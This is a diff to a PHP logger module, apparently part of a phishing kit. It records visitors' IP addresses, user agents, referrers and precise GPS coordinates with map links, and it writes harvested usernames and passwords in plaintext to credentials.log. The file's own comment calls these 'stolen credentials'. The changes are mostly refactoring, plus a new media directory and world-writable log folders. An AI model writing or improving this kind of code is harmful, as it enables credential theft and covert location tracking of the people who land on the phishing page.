@@ -1,40 +1,42 @@
 <?php
 /**
  * logger.php
- * 
- * Provides helper functions for:
- *  - Logging environment details
- *  - Logging user agent info
- *  - Logging geolocation
- *  - Logging credentials
+ * Provides helper functions:
+ *  - logToFile
+ *  - logEnvironment
+ *  - logUserAgent
+ *  - logGeolocation
+ *  - logCredentials
+ *  - getClientIP
  */
 
 require_once __DIR__ . '/config.php';
 
-/**
- * Ensure the logs directory exists.
- */
 if (!is_dir(LOG_DIR)) {
     mkdir(LOG_DIR, 0777, true);
 }
 
+if (!is_dir(MEDIA_DIR)) {
+    mkdir(MEDIA_DIR, 0777, true);
+}
+
 /**
- * Generic function: append message to a file, truncate if too large.
+ * Append message to a file. Truncates if file size > LOG_MAX_SIZE.
  */
 function logToFile(string $filePath, string $message)
 {
     if (file_exists($filePath) && filesize($filePath) > LOG_MAX_SIZE) {
-        file_put_contents($filePath, "");
+        file_put_contents($filePath, ""); // clear file
     }
     file_put_contents($filePath, $message, FILE_APPEND);
 }
 
 /**
- * Log environment details to environment.log
+ * Logs environment details (IP, UA, ref, etc.) to environment.log.
  */
 function logEnvironment()
 {
-    $date   = date("Y-m-d H:i:s");
+    $date   = date('Y-m-d H:i:s');
     $ip     = getClientIP();
     $port   = $_SERVER['REMOTE_PORT'] ?? 'UNKNOWN';
     $ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
@@ -43,13 +45,12 @@ function logEnvironment()
     $ref    = $_SERVER['HTTP_REFERER'] ?? 'UNKNOWN';
     $query  = $_SERVER['QUERY_STRING'] ?? '';
 
-    // Attempt reverse DNS if REMOTE_HOST is unknown
     if ($host === 'UNKNOWN' && $ip !== 'UNKNOWN') {
         $rev = @gethostbyaddr($ip);
         if ($rev) $host = $rev;
     }
 
-    $logEntry = sprintf(
+    $entry = sprintf(
         "[%s] IP: %s | PORT: %s | HOST: %s | METHOD: %s | UA: %s | REF: %s | QUERY: %s\n",
         $date,
         $ip,
@@ -60,22 +61,22 @@ function logEnvironment()
         $ref,
         $query
     );
-    logToFile(LOG_FILE_ENV, $logEntry);
+    logToFile(LOG_FILE_ENV, $entry);
 }
 
 /**
- * Log user-agent info to user_agents.log
+ * Logs user-agent info to user_agents.log.
  */
 function logUserAgent()
 {
-    $date   = date("Y-m-d H:i:s");
+    $date   = date('Y-m-d H:i:s');
     $ip     = getClientIP();
     $ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
     $ref    = $_SERVER['HTTP_REFERER'] ?? 'UNKNOWN';
     $script = $_SERVER['SCRIPT_NAME'] ?? 'UNKNOWN';
     $query  = $_SERVER['QUERY_STRING'] ?? '';
 
-    $logEntry = sprintf(
+    $entry = sprintf(
         "[%s] IP: %s | UA: %s | REF: %s | SCRIPT: %s | QUERY: %s\n",
         $date,
         $ip,
@@ -84,37 +85,37 @@ function logUserAgent()
         $script,
         $query
     );
-    logToFile(LOG_FILE_UA, $logEntry);
+    logToFile(LOG_FILE_UA, $entry);
 }
 
 /**
- * Log geolocation data to geolocation.log
+ * Logs lat/lon to geolocation.log.
  */
 function logGeolocation(float $lat, float $lon)
 {
-    $date = date("Y-m-d H:i:s");
+    $date    = date('Y-m-d H:i:s');
     $mapsURL = "https://maps.google.com/maps?q={$lat},{$lon}";
 
-    $logEntry = sprintf(
+    $entry = sprintf(
         "[%s] Lat: %f | Lon: %f | Maps: %s\n",
         $date,
         $lat,
         $lon,
         $mapsURL
     );
-    logToFile(LOG_FILE_GEO, $logEntry);
+    logToFile(LOG_FILE_GEO, $entry);
 }
 
 /**
- * Log credentials to credentials.log
+ * Logs stolen credentials to credentials.log.
  */
 function logCredentials(string $username, string $password)
 {
-    $date = date("Y-m-d H:i:s");
+    $date = date('Y-m-d H:i:s');
     $ip   = getClientIP();
     $ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
 
-    $logEntry = sprintf(
+    $entry = sprintf(
         "[%s] IP: %s | UA: %s | USER: %s | PASS: %s\n",
         $date,
         $ip,
@@ -122,13 +123,13 @@ function logCredentials(string $username, string $password)
         $username,
         $password
     );
-    logToFile(LOG_FILE_CREDS, $logEntry);
+    logToFile(LOG_FILE_CREDS, $entry);
 }
 
 /**
- * Obtain the client IP considering proxy headers.
+ * Helper to get the client IP (accounting for proxies).
  */
-function getClientIP()
+function getClientIP(): string
 {
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
         return $_SERVER['HTTP_CLIENT_IP'];
